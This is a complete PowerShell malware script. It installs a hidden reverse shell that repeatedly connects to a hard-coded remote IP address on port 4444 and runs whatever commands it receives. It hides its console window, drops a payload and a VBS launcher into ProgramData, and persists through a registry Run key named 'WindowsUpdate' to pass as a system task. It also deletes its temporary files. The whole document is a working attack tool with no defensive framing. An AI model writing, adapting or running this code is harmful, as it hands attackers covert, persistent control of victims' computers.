# Completely hidden reverse shell with proper startup hiding
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
[Console.Window]::Hide()

# Persistence paths
$psPath = "C:\ProgramData\System.ps1"
$vbsPath = "C:\ProgramData\Sys.vbs"

# Create the main reverse shell script
$psContent = @'
Add-Type -Name Window -Namespace Console -MemberDefinition ''[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'';[Console.Window]::Hide()
while($true){try{$c=New-Object Net.Sockets.TCPClient("143.110.191.171",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=iex $d 2>&1;$p=$o|Out-String;$q=$p+"PS "+(pwd).Path+"> ";$w=[text.encoding]::ASCII.GetBytes($q);$s.Write($w,0,$w.Length);$s.Flush()};$c.Close()}catch{Start-Sleep -Seconds 10}}
'@
Set-Content $psPath $psContent

# Create VBS script for completely hidden startup execution
$vbsContent = @"
Set ws = CreateObject("Wscript.Shell")
ws.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$psPath""", 0, False
"@
Set-Content $vbsPath $vbsContent

# Registry persistence using VBS (completely hidden)
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "wscript.exe `"$vbsPath`""

# Start hidden immediately using VBS
$tempVbs = Join-Path $env:TEMP "temp.vbs"
Set-Content $tempVbs $vbsContent
Start-Process wscript.exe -ArgumentList "`"$tempVbs`"" -WindowStyle Hidden

# Cleanup temp files after 10 seconds
Start-Sleep -Seconds 10
Remove-Item $tempVbs -Force -ErrorAction SilentlyContinue
